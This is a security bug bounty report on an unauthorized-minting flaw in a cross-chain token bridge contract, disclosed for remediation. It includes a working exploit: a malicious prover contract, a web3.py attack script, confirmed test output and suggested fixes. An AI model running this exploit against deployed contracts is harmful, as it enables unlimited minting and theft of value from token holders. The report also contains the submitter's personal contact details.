# CRITICAL — MintableUSCBridge.mintFromQuery Accepts Untrusted Prover Contract, Enabling Unlimited Token Minting

**Program**: SpaceCoin — CertIK SkyShield  
**Severity**: Critical  
**Category**: Smart Contract — Unauthorized Token Minting  
**CWE**: CWE-284 (Improper Access Control)  
**Repository**: https://github.com/gluwa/CCNext-smart-contracts  
**File**: `contracts/MintableUSCBridge.sol`  
**Date**: 2026-06-08

---

## Summary

`MintableUSCBridge.mintFromQuery` accepts a user-controlled `proverContractAddr` parameter with no validation that the prover is trusted. An attacker deploys a malicious prover contract that returns crafted `QueryDetails` with a fake ERC-20 `Transfer` event and a large `amount`, satisfying every on-chain check. The contract then calls `_mint(attacker, amount)`, minting unlimited tokens to the attacker.

The sibling contract `UniversalBridgeProxy.uscBridgeCompleteMint` contains an explicit code comment explaining exactly this attack class, and guards against it with `require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal))`. `MintableUSCBridge` omits this check entirely.

---

## Vulnerability Details

### Root Cause

```solidity
// contracts/MintableUSCBridge.sol
function mintFromQuery(
    address proverContractAddr,   // ← user-controlled, not validated
    bytes32 queryId
) external {
    if (processedQueries[queryId]) revert QueryAlreadyProcessed();
    processedQueries[queryId] = true;

    (bytes32 functionSig, ResultSegment[] memory eventSegments)
        = _processUSCQuery(proverContractAddr, queryId);    // ← calls prover.getQueryDetails() on attacker's address

    if (bytes4(functionSig) != TRANSFER_EVENT_SIG) revert InvalidFunctionSignature();
    ...
    _mint(from, amount);   // ← MINTS TOKENS
}
```

`_processUSCQuery` (in `UniversalSmartContract_Core`) simply calls `ICreditcoinPublicProver(proverContractAddr).getQueryDetails(queryId)` and returns whatever the prover returns. If `proverContractAddr` is a malicious contract, it can return any data it wants.

### Missing Check (Present in Sibling Contract)

`UniversalBridgeProxy.uscBridgeCompleteMint` (the secure counterpart) contains:

```solidity
QueryDetails memory queryDetails = prover.getQueryDetails(queryId);

// We only accept queries submitted using admin keys, such as from our own
// query builder worker. Otherwise there is no guarantee that the result
// segments provided actually pertain to our protocol. They could be
// constructed by bad actors to look like an interaction with our mint/burn
// contract, when in fact they come from some completely unrelated finalized
// transaction on the source chain.
require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal));  // ← THIS CHECK IS MISSING IN MintableUSCBridge
```

This comment literally describes the attack that `MintableUSCBridge` is vulnerable to.

---

## Proof of Concept

### Step 1 — Deploy MaliciousProver on any EVM network

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gluwa/creditcoin-public-prover/contracts/sol/Types.sol";

contract MaliciousProver {
    address public attacker;
    uint256 public mintAmount;

    constructor(address _attacker, uint256 _mintAmount) {
        attacker  = _attacker;
        mintAmount = _mintAmount;
    }

    // Implements ICreditcoinPublicProver.getQueryDetails
    function getQueryDetails(bytes32 /*queryId*/) external view returns (QueryDetails memory qd) {
        ResultSegment[] memory segs = new ResultSegment[](8);

        // segs[0..3]: unused padding (zeros)

        // segs[4]: Event Signature — first 4 bytes must equal TRANSFER_EVENT_SIG (0xddf252ad)
        segs[4].abiBytes = bytes32(
            0xddf252ad00000000000000000000000000000000000000000000000000000000
        );

        // segs[5]: "from" address (minted to attacker)
        segs[5].abiBytes = bytes32(uint256(uint160(attacker)));

        // segs[6]: "to" address — must be address(0) to satisfy InvalidBurnAddress check
        segs[6].abiBytes = bytes32(0);

        // segs[7]: amount to mint (arbitrary)
        segs[7].abiBytes = bytes32(mintAmount);

        LayoutSegment[] memory empty = new LayoutSegment[](0);
        qd = QueryDetails({
            state:          QueryState.ResultAvailable,
            query:          ChainQuery({chainId: 0, height: 0, index: 0, layoutSegments: empty}),
            escrowedAmount: Balance.wrap(0),
            principal:      attacker,   // not checked by MintableUSCBridge
            estimatedCost:  Balance.wrap(0),
            timestamp:      0,
            resultSegments: segs
        });
    }
}
```

### Step 2 — Call mintFromQuery with a fresh queryId

```python
# poc_mintable_usc_bridge.py
from web3 import Web3

RPC = "https://<creditcoin-or-testnet-rpc>"
BRIDGE_ADDR = "<MintableUSCBridge_concrete_address>"
MALICIOUS_PROVER = "<MaliciousProver_deployed_address>"
ATTACKER_KEY = "<attacker_private_key>"

w3 = Web3(Web3.HTTPProvider(RPC))
attacker = w3.eth.account.from_key(ATTACKER_KEY)

BRIDGE_ABI = [
    {
        "inputs": [
            {"name": "proverContractAddr", "type": "address"},
            {"name": "queryId",            "type": "bytes32"}
        ],
        "name": "mintFromQuery",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

bridge = w3.eth.contract(address=BRIDGE_ADDR, abi=BRIDGE_ABI)
query_id = w3.keccak(text="attacker_nonce_1")   # fresh queryId every call

tx = bridge.functions.mintFromQuery(MALICIOUS_PROVER, query_id).build_transaction({
    "from":  attacker.address,
    "nonce": w3.eth.get_transaction_count(attacker.address),
    "gas":   500_000,
})
signed = attacker.sign_transaction(tx)
txhash = w3.eth.send_raw_transaction(signed.rawTransaction)
receipt = w3.eth.wait_for_transaction_receipt(txhash)
print(f"Minted! tx: {txhash.hex()}, block: {receipt['blockNumber']}")

# Repeat with query_id = keccak(b"attacker_nonce_2"), etc. — unlimited minting
```

### Confirmed PoC Output

**Foundry unit test** (`forge test --match-test test_unlimitedMint -vvvv`):

```
Ran 1 test for test/poc_MintableUSCBridge_test.sol:MintableUSCBridgePoc
[PASS] test_unlimitedMint() (gas: 200212)
Logs:
  === ATTACK SUCCEEDED ===
  Attacker balance: 2000000 tokens
  Total supply:     2000000 tokens
  Root cause: mintFromQuery accepts any proverContractAddr with no
              check on queryDetails.principal (unlike UniversalBridgeProxy).
```

Key trace (abridged):
```
[106191] ConcreteUSCBridge::mintFromQuery(MaliciousProver, queryId1)
  [8151] MaliciousProver::getQueryDetails(queryId1)  ← returns crafted segments
    └─ Return: principal=attacker, segs[4]=0xddf252ad..., segs[5]=attacker, segs[6]=0x0, segs[7]=1e24
  emit Transfer(from=0x0, to=attacker, amount=1_000_000e18)
  emit TokensMinted(recipient=attacker, amount=1_000_000e18)

[59891] ConcreteUSCBridge::mintFromQuery(MaliciousProver, queryId2)
  emit Transfer(from=0x0, to=attacker, amount=1_000_000e18)   ← second mint, fresh queryId
```

**End-to-end Python script** (`python3 poc_mintable_usc_bridge_unlimited_mint.py`):

```
[1/3] Starting local Anvil node...
      Anvil running at http://127.0.0.1:8545

[2/3] Running forge script (deploy + attack)...

  [deploy] ConcreteUSCBridge: 0x5FbDB2315678afecb367f032d93F642f64180aa3
  [deploy] MaliciousProver:   0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
  [pre]    attacker balance:  0 tokens
  [pre]    total supply:      0 tokens
  [call1]  mintFromQuery(maliciousProver, nonce_1)  ->  1,000,000 tokens minted
  [call2]  mintFromQuery(maliciousProver, nonce_2)  ->  1,000,000 tokens minted
  === ATTACK CONFIRMED ===
  Attacker balance: 2000000 tokens
  Total supply:     2000000 tokens

[3/3] RESULT: forge script exited successfully
```

### Why Every Check Passes

| Check | Required Value | Supplied by MaliciousProver | Passes? |
|---|---|---|---|
| `resultSegments.length >= 8` | ≥ 8 | exactly 8 | ✓ |
| `bytes4(functionSig) == TRANSFER_EVENT_SIG` | `0xddf252ad` | `segs[4].abiBytes[0:4]` = `0xddf252ad` | ✓ |
| `eventSegments.length >= 3` | ≥ 3 | 3 (`segs[5..7]`) | ✓ |
| `amount != 0` | `> 0` | `mintAmount > 0` | ✓ |
| `to == address(0)` (InvalidBurnAddress) | exactly `address(0)` | `segs[6] = bytes32(0)` | ✓ |
| `from != address(0)` (InvalidRecipient) | `!= address(0)` | `segs[5] = attacker address` | ✓ |
| `queryDetails.principal` check | **MISSING** | — | N/A |

All checks pass. `_mint(attacker, mintAmount)` executes.

---

## Impact

**Severity: Critical** — Direct unauthorized minting of the cross-chain SpaceCoin token.

The attacker can:
1. Mint tokens in any quantity (total supply can be inflated to `type(uint256).max`)
2. Repeat with a fresh `queryId` each call (each call costs only gas)
3. Dump minted tokens on any DEX, stealing real value from existing holders
4. Bridge the inflated supply to other chains, draining liquidity pools

This fits the scope definition of Critical exactly: *"unauthorized token minting"* and *"bugs which break core invariants: total supply, fund balances, accounting consistency."*

---

## Comparison with Secure Counterpart

The `UniversalBridgeProxy.uscBridgeCompleteMint` function was clearly designed with the same attack class in mind and includes the correct mitigations:

```
MintableUSCBridge.mintFromQuery:          UniversalBridgeProxy.uscBridgeCompleteMint:
─────────────────────────────────         ──────────────────────────────────────────────
proverContractAddr: user-controlled ←→   proverContractAddr: user-controlled
                                          require(hasRole(DEFAULT_ADMIN_ROLE,
                                                          queryDetails.principal))  ← MISSING
_mint(from, amount)                 ←→   IERC20Mintable(token).mint(principal, amount)
```

---

## Recommendation

Add a principal validation check to `MintableUSCBridge._processUSCQuery` or to `mintFromQuery` itself, mirroring the pattern in `UniversalBridgeProxy`:

```solidity
// Option A: check in mintFromQuery (minimal change)
function mintFromQuery(address proverContractAddr, bytes32 queryId) external {
    if (processedQueries[queryId]) revert QueryAlreadyProcessed();
    processedQueries[queryId] = true;

    ICreditcoinPublicProver prover = ICreditcoinPublicProver(proverContractAddr);
    QueryDetails memory queryDetails = prover.getQueryDetails(queryId);

+   // Only accept queries submitted by authorized principals (matches UniversalBridgeProxy pattern)
+   require(hasRole(PROVER_ROLE, queryDetails.principal), "Untrusted query principal");

    (bytes32 functionSig, ResultSegment[] memory eventSegments)
        = _processUSCQuery(proverContractAddr, queryId);
    ...
}

// Option B: whitelist trusted prover addresses
mapping(address => bool) public trustedProvers;
modifier onlyTrustedProver(address prover) {
    require(trustedProvers[prover], "Untrusted prover");
    _;
}
function mintFromQuery(address proverContractAddr, bytes32 queryId)
    external onlyTrustedProver(proverContractAddr) { ... }
```

---

## Files Referenced

| File | Role |
|---|---|
| `contracts/MintableUSCBridge.sol` | Vulnerable contract — missing principal check |
| `contracts/UniversalSmartContract_Core.sol` | Base — `_processUSCQuery` calls prover without validation |
| `contracts/UniversalBridgeProxy.sol` | Secure sibling — contains the required admin check |
| `@gluwa/creditcoin-public-prover` | Prover interface — `ICreditcoinPublicProver.getQueryDetails` |

---

## Submission Metadata

- **Wallet**: `0x3fba877c0927B16f5A6568Ebc1db286324dA9c2b`
- **Email**: willworrachat@gmail.com
- **Tested on**: Private local fork (no mainnet interaction)
- **PoC language**: Solidity + Python (web3.py)
